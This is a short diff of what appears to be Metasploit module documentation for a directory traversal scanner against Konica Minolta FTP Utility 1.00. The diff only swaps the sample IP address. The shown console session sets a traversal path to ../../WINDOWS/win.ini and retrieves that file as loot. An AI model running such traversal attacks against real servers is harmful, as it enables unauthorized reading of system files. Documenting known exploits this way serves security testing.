@@ -22,7 +22,7 @@ Link to Konica Minolta FTP Utility 1.00 software download [Exploit-DB](https://w
   set PATH ../../WINDOWS/win.ini
     PATH => ../../WINDOWS/win.ini
   msf5 auxiliary(scanner/ftp/konica_ftp_traversal) > run
-  [+] 192.168.2.253:21      - Stored ../../WINDOWS/win.ini to /root/.msf4/loot/20191122042114_default_192.168.2.253_konica.ft     p.data_003802.ini
-  [*] 192.168.2.253:21      - Scanned 1 of 1 hosts (100% complete)
+  [+] 1.1.1.1:21      - Stored ../../WINDOWS/win.ini to /root/.msf4/loot/20191122042114_default_192.168.2.253_konica.ft     p.data_003802.ini
+  [*] 1.1.1.1:21      - Scanned 1 of 1 hosts (100% complete)
   [*] Auxiliary module execution completed
   ```
